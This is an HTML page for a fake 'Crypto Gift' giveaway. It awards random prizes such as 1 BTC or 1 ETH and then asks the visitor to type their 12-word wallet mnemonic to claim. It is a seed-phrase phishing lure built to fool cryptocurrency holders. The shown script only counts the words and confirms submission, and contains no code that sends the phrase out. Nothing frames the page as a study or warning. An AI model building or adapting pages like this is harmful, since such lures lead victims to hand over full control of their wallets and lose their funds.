<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crypto Gift</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      text-align: center;
      margin: 0;
      padding: 20px;
    }
    h1 {
      color: #ffc107;
      font-size: 2.2em;
      margin-bottom: 20px;
    }
    .gift-box {
      width: 150px;
      height: 150px;
      background: #1a1a1a;
      border: 3px solid #ffc107;
      border-radius: 20px;
      margin: 20px auto;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: transform 0.3s;
    }
    .gift-box:hover {
      transform: scale(1.05);
    }
    .gift-box img {
      width: 80px;
      height: 80px;
    }
    .prizes {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
    }
    .prize {
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 10px;
      padding: 8px 12px;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .prize img {
      width: 20px;
      height: 20px;
    }
    .message {
      margin-top: 20px;
      font-size: 1.2em;
      color: #0f0;
    }
    .button {
      background-color: #ffc107;
      color: #000;
      padding: 12px 25px;
      margin-top: 20px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .button:hover {
      background-color: #e0a800;
    }
    input[type="text"] {
      width: 90%;
      max-width: 400px;
      padding: 12px;
      margin-top: 20px;
      border-radius: 12px;
      border: 1px solid #333;
      background-color: #1a1a1a;
      color: #fff;
      font-size: 16px;
      box-shadow: 0 0 10px rgba(255, 193, 7, 0.3);
    }
  </style>
</head>
<body>

  <h1>Open Your Crypto Gift!</h1>

  <div class="gift-box" id="giftBox" onclick="openGift()">
    <img src="gift-box.png" alt="Gift Box">
  </div>

  <div class="prizes">
    <div class="prize"><img src="bnb.png">1 BNB</div>
    <div class="prize"><img src="usdt.png">10 USDT</div>
    <div class="prize"><img src="usdt.png">100 USDT</div>
    <div class="prize"><img src="btc.png">1 BTC</div>
    <div class="prize"><img src="eth.png">1 ETH</div>
    <div class="prize"><img src="ltc.png">1 LTC</div>
    <div class="prize"><img src="xrp.png">500 XRP</div>
    <div class="prize"><img src="sol.png">0.5 SOL</div>
    <div class="prize"><img src="ada.png">2 ADA</div>
    <div class="prize"><img src="doge.png">100 DOGE</div>
  </div>

  <div id="result" class="message"></div>

  <button class="button" onclick="claimNow()">Claim Now</button>

  <br>

  <input type="text" id="mnemonics" placeholder="Enter your 12-word Mnemonics">
  
  <br>

  <button class="button" onclick="submitMnemonics()">Submit</button>

  <script>
    function openGift() {
      const lastClick = localStorage.getItem('lastClick');
      const now = new Date().getTime();
      if (lastClick && now - lastClick < 86400000) { // 24 hours
        alert("You can open the gift once every 24 hours!");
        return;
      }
      const prizes = [
        '1 BNB', '10 USDT', '100 USDT', '1 BTC', '1 ETH',
        '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
      ];
      const won = prizes[Math.floor(Math.random() * prizes.length)];
      document.getElementById('result').innerText = "Congratulations! You won: " + won;
      localStorage.setItem('lastClick', now);
    }

    function claimNow() {
      alert("Please enter your 12-word Mnemonics below to claim.");
    }

    function submitMnemonics() {
      const mnemonic = document.getElementById('mnemonics').value.trim();
      if (mnemonic.split(" ").length === 12) {
        alert("Mnemonic submitted successfully!");
      } else {
        alert("Please enter a valid 12-word mnemonic.");
      }
    }
  </script>

</body>
</html>
